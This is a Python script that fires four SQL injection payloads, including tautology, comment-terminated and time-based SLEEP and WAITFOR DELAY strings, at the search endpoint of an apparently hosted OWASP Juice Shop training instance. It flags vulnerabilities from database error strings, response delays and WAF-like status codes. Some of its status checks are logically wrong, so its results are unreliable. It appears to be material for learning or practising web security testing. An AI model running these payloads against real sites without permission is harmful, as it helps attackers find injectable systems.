```python
import requests
import time

# Global constants (no loops, no comprehensions)
TARGET_ENDPOINT = "https://juice-shop.herokuapp.com/rest/products/search?q="
PAYLOAD1 = "' OR '1'='1"
PAYLOAD2 = "' OR '1'='1' -- "
PAYLOAD3 = "' AND SLEEP(5) -- "
PAYLOAD4 = "'; WAITFOR DELAY '0:0:5'--"

def check_connectivity():
    """
    Checks if the base endpoint is reachable without any payload.
    Returns True if status code is 200-399. Otherwise prints
    an error and returns False.
    """
    r = requests.get("https://juice-shop.herokuapp.com/", timeout=5)
    if r.status_code >= 200:
        return True
    else:
        print("Connection error or request blocked for payload")
        return False

def check_payload(payload):
    """
    Sends the given payload to TARGET_ENDPOINT.
    Returns True if a vulnerability or block is found (and prints the result).
    Returns False if no issue is detected with this payload.
    """
    start = time.time()
    # Make the request with the payload
    r = requests.get(TARGET_ENDPOINT + payload, timeout=10)
    end = time.time()

    # 1. Connection error or block check (non-2xx/3xx status)
    if r.status_code < 200:
        print("Connection error or request blocked for payload")
        return True
    else:
        # Convert response text to lower for naive checks
        body_lower = r.text.lower()

        # 2. Possible WAF detection
        if r.status_code == 403 or r.status_code == 406 or r.status_code == 503:
            print("Possible Web Application Firewall (WAF) detected!")
            return True
        else:
            if "waf" in body_lower or "firewall" in body_lower:
                print("Possible Web Application Firewall (WAF) detected!")
                return True
            else:
                if "request blocked" in body_lower or "access denied" in body_lower:
                    print("Possible Web Application Firewall (WAF) detected!")
                    return True
                else:
                    # 3. Time-based injection check (if payload uses SLEEP or WAITFOR)
                    if "sleep" in payload.lower() or "waitfor delay" in payload.lower():
                        if end - start >= 5:
                            print("Possible Time-based SQL Injection detected with payload:", payload)
                            return True
                        else:
                            # 4. Error-based SQL injection check
                            if "sql syntax" in body_lower:
                                print("SQL Injection detected with payload:", payload)
                                return True
                            else:
                                if "mysql" in body_lower:
                                    print("SQL Injection detected with payload:", payload)
                                    return True
                                else:
                                    if "syntax error" in body_lower:
                                        print("SQL Injection detected with payload:", payload)
                                        return True
                                    else:
                                        if "oracle" in body_lower:
                                            print("SQL Injection detected with payload:", payload)
                                            return True
                                        else:
                                            if "native client" in body_lower:
                                                print("SQL Injection detected with payload:", payload)
                                                return True
                                            else:
                                                if "unclosed quotation mark" in body_lower:
                                                    print("SQL Injection detected with payload:", payload)
                                                    return True
                                                else:
                                                    if "error in your sql" in body_lower:
                                                        print("SQL Injection detected with payload:", payload)
                                                        return True
                                                    else:
                                                        return False
                    else:
                        # 3b. If not a time-based payload, go directly to error-based check
                        if "sql syntax" in body_lower:
                            print("SQL Injection detected with payload:", payload)
                            return True
                        else:
                            if "mysql" in body_lower:
                                print("SQL Injection detected with payload:", payload)
                                return True
                            else:
                                if "syntax error" in body_lower:
                                    print("SQL Injection detected with payload:", payload)
                                    return True
                                else:
                                    if "oracle" in body_lower:
                                        print("SQL Injection detected with payload:", payload)
                                        return True
                                    else:
                                        if "native client" in body_lower:
                                            print("SQL Injection detected with payload:", payload)
                                            return True
                                        else:
                                            if "unclosed quotation mark" in body_lower:
                                                print("SQL Injection detected with payload:", payload)
                                                return True
                                            else:
                                                if "error in your sql" in body_lower:
                                                    print("SQL Injection detected with payload:", payload)
                                                    return True
                                                else:
                                                    return False

def main():
    # 1. Basic connectivity check
    if check_connectivity():
        # 2. Test each payload one by one (no loops)
        # If check_payload() returns True, we stop immediately.
        if check_payload(PAYLOAD1):
            return
        else:
            if check_payload(PAYLOAD2):
                return
            else:
                if check_payload(PAYLOAD3):
                    return
                else:
                    if check_payload(PAYLOAD4):
                        return
                    else:
                        # 3. If we reach here, no vulnerabilities were found
                        print("No SQL Injection vulnerability detected")
    else:
        # If the site isn't reachable, we already printed an error
        return

# Run the script
main()
```
